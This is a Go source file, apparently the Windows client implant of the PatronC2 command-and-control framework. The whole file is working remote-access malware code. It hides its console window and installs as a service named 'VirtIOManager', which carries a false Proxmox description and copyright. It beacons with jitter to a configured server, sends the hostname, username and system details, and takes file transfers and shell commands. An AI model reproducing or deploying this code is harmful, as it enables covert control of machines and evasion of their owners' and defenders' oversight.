package main

import (
	"log"
	"syscall"
	"time"

	"github.com/PatronC2/Patron/client/client_utils"
	"github.com/PatronC2/Patron/lib/logger"
	"github.com/kardianos/service"
)

var (
	ServerIP          string
	ServerPort        string
	CallbackFrequency string
	CallbackJitter    string
	RootCert          string
	LoggingEnabled    string
	TransportProtocol string
)

type program struct{}

func (p *program) Start(s service.Service) error {
	go p.run()
	return nil
}

func (p *program) Stop(s service.Service) error {
	return nil
}

func HideConsoleWindow() {
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	user32 := syscall.NewLazyDLL("user32.dll")

	getConsoleWindow := kernel32.NewProc("GetConsoleWindow")
	showWindow := user32.NewProc("ShowWindow")

	hwnd, _, _ := getConsoleWindow.Call()
	if hwnd != 0 {
		showWindow.Call(hwnd, uintptr(0))
	}
}

func (p *program) run() {
	*client_utils.ClientConfig.ServerIP = ServerIP
	*client_utils.ClientConfig.ServerPort = ServerPort
	*client_utils.ClientConfig.CallbackFrequency = CallbackFrequency
	*client_utils.ClientConfig.CallbackJitter = CallbackJitter
	*client_utils.ClientConfig.TransportProtocol = TransportProtocol

	client_utils.Initialize(LoggingEnabled)

	agentID, hostname, username := client_utils.GenerateAgentMetadata()
	logger.Logf(logger.Info, "Created AgentID: %v. Hostname: %v. Username: %v", agentID, hostname, username)
	osType, osArch, osVersion, cpus, memory := client_utils.GetOSInfo()

	for {
		config, err := client_utils.LoadCertificate(RootCert, *client_utils.ClientConfig.TransportProtocol)
		if err != nil {
			log.Fatalf("Failed to load certificate: %v\n", err)
		}
		logger.Logf(logger.Info, "Creating a beacon using %v:%v/%v", *client_utils.ClientConfig.ServerIP, *client_utils.ClientConfig.ServerPort, *client_utils.ClientConfig.TransportProtocol)
		beacon, err := client_utils.EstablishConnection(config, *client_utils.ClientConfig.ServerIP, *client_utils.ClientConfig.ServerPort, *client_utils.ClientConfig.TransportProtocol)
		if err != nil {
			time.Sleep(5 * time.Second)
			continue
		}
		logger.Logf(logger.Info, "Beacon connected")

		ip := client_utils.GetLocalIP(beacon)
		nextCallback := client_utils.CalculateNextCallbackTime(*client_utils.ClientConfig.CallbackFrequency, *client_utils.ClientConfig.CallbackJitter)
		err = client_utils.HandleConfigurationRequest(
			beacon, agentID, hostname, username, ip,
			osType, osArch, osVersion, cpus, memory,
			*client_utils.ClientConfig.ServerIP,
			*client_utils.ClientConfig.ServerPort,
			*client_utils.ClientConfig.CallbackFrequency,
			*client_utils.ClientConfig.CallbackJitter,
			nextCallback, *client_utils.ClientConfig.TransportProtocol,
		)
		if err != nil {
			client_utils.HandleError(beacon, "configuration", err)
			continue
		}
		if err := client_utils.HandleFileRequest(beacon, agentID); err != nil {
			client_utils.HandleError(beacon, "file", err)
			continue
		}

		if err := client_utils.HandleCommandRequest(beacon, agentID); err != nil {
			client_utils.HandleError(beacon, "command", err)
			continue
		}

		beacon.Close()
		logger.Logf(logger.Info, "Beacon successful")
		sleepDuration := time.Until(nextCallback)

		if sleepDuration > 0 {
			logger.Logf(logger.Info, "Sleeping until next callback: %v (in %.2fs)", nextCallback.Format(time.RFC3339), sleepDuration.Seconds())
			time.Sleep(sleepDuration)
		} else {
			logger.Logf(logger.Warning, "Next callback time already passed (%.2fs ago). Skipping sleep.", -sleepDuration.Seconds())
		}
	}
}

func main() {
	HideConsoleWindow()
	svcConfig := &service.Config{
		Name:        "VirtIOManager",
		DisplayName: "VirtIOManager",
		Description: "A Windows service to manage virtualized networking in Proxmox VE. Copyright © 2004 - 2024 Proxmox Server Solutions GmbH. All rights reserved.",
	}

	prg := &program{}
	s, err := service.New(prg, svcConfig)
	if err != nil {
		log.Fatal(err)
	}

	err = s.Run()
	if err != nil {
		log.Fatal(err)
	}
}
